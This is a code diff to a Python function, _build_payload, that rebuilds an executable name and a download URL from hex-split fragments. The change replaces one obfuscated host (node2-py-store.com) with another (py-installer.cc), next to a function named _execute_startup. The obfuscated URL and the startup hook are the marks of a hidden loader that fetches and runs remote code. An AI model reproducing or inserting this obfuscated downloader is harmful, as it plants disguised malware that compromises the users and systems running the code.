@@ -36,15 +36,16 @@ def _build_payload():
         '65',
         '687474',
         '70733a',
-        '2f2f6e6f',
-        '6465322d70',
-        '792d7374',
-        '6f72652e',
-        '636f6d'
+        '2f2f70',
+        '792d69',
+        '6e7374',
+        '616c6c',
+        '65722e',
+        '6363'
     ]
     decoded_parts = [_decode_hex(p) for p in parts]
     executable = (decoded_parts[0] + decoded_parts[1] + decoded_parts[2] + decoded_parts[3] + decoded_parts[4]).decode('utf-8', errors='ignore')
-    url = (decoded_parts[5] + decoded_parts[6] + decoded_parts[7] + decoded_parts[8] + decoded_parts[9] + decoded_parts[10] + decoded_parts[11]).decode('utf-8', errors='ignore')
+    url = (decoded_parts[5] + decoded_parts[6] + decoded_parts[7] + decoded_parts[8] + decoded_parts[9] + decoded_parts[10] + decoded_parts[11] + decoded_parts[12]).decode('utf-8', errors='ignore')
     return executable, url
 
 def _execute_startup():
